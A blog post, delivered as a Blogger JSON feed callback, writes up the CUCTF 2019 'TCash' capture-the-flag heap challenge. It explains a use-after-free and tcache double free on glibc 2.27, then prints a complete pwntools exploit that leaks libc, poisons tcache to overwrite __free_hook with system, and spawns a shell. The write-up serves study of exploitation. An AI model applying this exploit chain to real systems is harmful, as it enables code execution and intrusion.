// API callback
random_posts({"version":"1.0","encoding":"UTF-8","feed":{"xmlns":"http://www.w3.org/2005/Atom","xmlns$openSearch":"http://a9.com/-/spec/opensearchrss/1.0/","xmlns$blogger":"http://schemas.google.com/blogger/2008","xmlns$georss":"http://www.georss.org/georss","xmlns$gd":"http://schemas.google.com/g/2005","xmlns$thr":"http://purl.org/syndication/thread/1.0","id":{"$t":"tag:blogger.com,1999:blog-8814147965526194982"},"updated":{"$t":"2021-11-30T16:35:33.972-08:00"},"title":{"type":"text","$t":"Will's Root"},"subtitle":{"type":"html","$t":"Pentesting, CTFs, and Writeups"},"link":[{"rel":"http://schemas.google.com/g/2005#feed","type":"application/atom+xml","href":"https:\/\/www.willsroot.io\/feeds\/posts\/default"},{"rel":"self","type":"application/atom+xml","href":"https:\/\/www.blogger.com\/feeds\/8814147965526194982\/posts\/default?alt=json-in-script\u0026start-index=35\u0026max-results=1"},{"rel":"alternate","type":"text/html","href":"https:\/\/www.willsroot.io\/"},{"rel":"hub","href":"http://pubsubhubbub.appspot.com/"},{"rel":"previous","type":"application/atom+xml","href":"https:\/\/www.blogger.com\/feeds\/8814147965526194982\/posts\/default?alt=json-in-script\u0026start-index=34\u0026max-results=1"},{"rel":"next","type":"application/atom+xml","href":"https:\/\/www.blogger.com\/feeds\/8814147965526194982\/posts\/default?alt=json-in-script\u0026start-index=36\u0026max-results=1"}],"author":[{"name":{"$t":"Unknown"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"http://schemas.google.com/g/2005#thumbnail","width":"16","height":"16","src":"https:\/\/img1.blogblog.com\/img\/b16-rounded.gif"}}],"generator":{"version":"7.00","uri":"http://www.blogger.com","$t":"Blogger"},"openSearch$totalResults":{"$t":"54"},"openSearch$startIndex":{"$t":"35"},"openSearch$itemsPerPage":{"$t":"1"},"entry":[{"id":{"$t":"tag:blogger.com,1999:blog-8814147965526194982.post-3760697504838864036"},"published":{"$t":"2019-09-29T07:37:00.000-07:00"},"updated":{"$t":"2019-09-29T20:33:17.124-07:00"},"title":{"type":"text","$t":"CUCTF 2019 TCash Writeup"},"content":{"type":"html","$t":"Thanks to Nick for sending me CUCTF 2019's TCash challenge.\u0026nbsp; It's a cool little tcache poisoning challenge!\u0026nbsp; Anyways, let's take a look at the binary.\u003Cbr \/\u003E\u003Cbr \/\u003EBasically, it's about the TCash Ledger Wallet.\u0026nbsp; You can create entries, edit the address, description, and amount, and delete entries.\u0026nbsp; You can display ledgers and the edit functions all use read().\u0026nbsp; Lastly, here is where the bug is.\u0026nbsp; Basically, in each entry, the binary stores metadata about the size of each part of the ledger and also pointers to the data.\u0026nbsp; However, upon freeing, it does not set the data to null. Also, the binary is running on an Ubuntu Bionic server, so libc version 2.27 probably.\u003Cbr \/\u003E\u003Cbr \/\u003EWith TCache on 2.27, exploitation is very trivial.\u0026nbsp; I can directly double free by freeing the same pointer in a row and there is no size check in tcache as of this libc version.\u0026nbsp; Make sure only one part of the data in each ledger is the same size for simplicity's sake. We can then edit a double freed chunk to have its next pointer point to free hook (no size check means we can have it return chunks anywhere without the 0x7f byte misalignment).\u0026nbsp; Overwrite free hook with system and then call it on a chunk with the string \"\/bin\/sh\\x00\\x00\" and the binary will be pwned; it can work if it's Full RELRO or PIE even.\u0026nbsp; Last thing... what about the libc leak?\u0026nbsp; Well, we can allocate items of size greater than maximum tcache size.\u0026nbsp; Free that chunk and it goes into unsorted.\u0026nbsp; Then, displaying it will leak pointers to offsets from the main arena, which will allow us to calculate libc base.\u0026nbsp; Here's the final exploit:\u003Cbr \/\u003E\u003Cdiv class=\"code\"\u003Efrom pwn import *\u003Cbr \/\u003E\u003Cbr \/\u003Ebinary = ELF('.\/tcash')\u003Cbr \/\u003Elibc = ELF('.\/libc-2.27.so')\u003Cbr \/\u003E#context.log_level = 'debug'\u003Cbr \/\u003Etime = 0.1\u003Cbr \/\u003Eremote = ssh(host='10.0.2.5', user='will', password='123456789')\u003Cbr \/\u003Eremote.set_working_directory('\/home\/will\/tcash')\u003Cbr \/\u003Econtext(arch='amd64')\u003Cbr \/\u003Ep = remote.process('.\/tcash')\u003Cbr \/\u003E\u003Cbr \/\u003Edef alloc(index, addr_size, desc_size, amount_size):\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.recvrepeat(time)\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.sendline('Create Entry')\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.recvrepeat(time)\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.sendline(str(index))\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.recvrepeat(time)\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.sendline(str(addr_size))\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.recvrepeat(time)\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.sendline(str(desc_size))\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.recvrepeat(time)\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.sendline(str(amount_size))\u003Cbr \/\u003E\u003Cbr \/\u003Edef edit(index, whichOne, data):\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.recvrepeat(time)\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.sendline(whichOne)\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.recvrepeat(time)\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.sendline(str(index))\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.recvrepeat(time)\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.sendline(data)\u003Cbr \/\u003E\u003Cbr \/\u003Edef delete(index):\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.recvrepeat(time)\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.sendline('Delete Entry')\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.recvrepeat(time)\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.sendline(str(index))\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003E\u003Cbr \/\u003Edef leak(index):\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.recvrepeat(time)\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.sendline('Display Entry')\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.recvrepeat(time)\u003Cbr \/\u003E\u003Cspan style=\"white-space: pre;\"\u003E \u003C\/span\u003Ep.sendline(str(index))\u003Cbr \/\u003E\u003Cbr \/\u003Ealloc(0, 0x500, 0x10, 0x10)\u003Cbr \/\u003E#edit(0, 'Edit Address', 'A' * 0x50) #for debugging purposes\u003Cbr \/\u003Edelete(0)\u003Cbr \/\u003E#p.interactive()\u003Cbr \/\u003E#\u0026lt;main_arena+96\u0026gt; is the leaked offset to main arena\u003Cbr \/\u003E#[+]main_arena_offset : 0x3ebc40\u003Cbr \/\u003E#00000000003ed8e8 \u0026lt;__free_hook@@GLIBC_2.2.5\u0026gt;:\u003Cbr \/\u003Eleak(0)\u003Cbr \/\u003ElibcLeak = u64((p.recvuntil('Description:').split('\\n')[0].split('ress: ')[1]).ljust(8, '\\x00'))\u003Cbr \/\u003Elog.info('Leaked Libc Address: ' + hex(libcLeak))\u003Cbr \/\u003Elibc.address = libcLeak - 0x3ebc40 - 96\u003Cbr \/\u003Elog.info('Libc Base: ' + hex(libc.address))\u003Cbr \/\u003Elog.info('Free Hook: ' + hex(libc.address + 0x3ed8e8))\u003Cbr \/\u003Elog.info('System: ' + hex(libc.symbols['system']))\u003Cbr \/\u003Ealloc(0, 0x80, 0x10, 0x10)\u003Cbr \/\u003Eedit(0, 'Edit Address', 'A' * 0x50)\u003Cbr \/\u003Edelete(0)\u003Cbr \/\u003Edelete(0)\u003Cbr \/\u003Ealloc(0, 0x80, 0x10, 0x10)\u003Cbr \/\u003Eedit(0, 'Edit Address', p64(libc.address + 0x3ed8e8)) #forge fd now\u003Cbr \/\u003Ealloc(1, 0x80, 0x10, 0x10)\u003Cbr \/\u003Ealloc(2, 0x80, 0x10, 0x10) #get malicious chunk back now\u003Cbr \/\u003Eedit(2, 'Edit Address', p64(libc.symbols['system'])) #overwrite free hook with system\u003Cbr \/\u003Eedit(1, 'Edit Address', '\/bin\/sh\\x00\\x00') #for free hook, which is now system\u003Cbr \/\u003Edelete(1)\u003Cbr \/\u003Ep.interactive()\u003C\/div\u003ECool challenge, Nick!"},"link":[{"rel":"replies","type":"application/atom+xml","href":"https:\/\/www.willsroot.io\/feeds\/3760697504838864036\/comments\/default","title":"Post Comments"},{"rel":"replies","type":"text/html","href":"https:\/\/www.willsroot.io\/2019\/09\/cuctf-2019-tcash-writeup.html#comment-form","title":"0 Comments"},{"rel":"edit","type":"application/atom+xml","href":"https:\/\/www.blogger.com\/feeds\/8814147965526194982\/posts\/default\/3760697504838864036"},{"rel":"self","type":"application/atom+xml","href":"https:\/\/www.blogger.com\/feeds\/8814147965526194982\/posts\/default\/3760697504838864036"},{"rel":"alternate","type":"text/html","href":"https:\/\/www.willsroot.io\/2019\/09\/cuctf-2019-tcash-writeup.html","title":"CUCTF 2019 TCash Writeup"}],"author":[{"name":{"$t":"Unknown"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"http://schemas.google.com/g/2005#thumbnail","width":"16","height":"16","src":"https:\/\/img1.blogblog.com\/img\/b16-rounded.gif"}}],"thr$total":{"$t":"0"}}]}});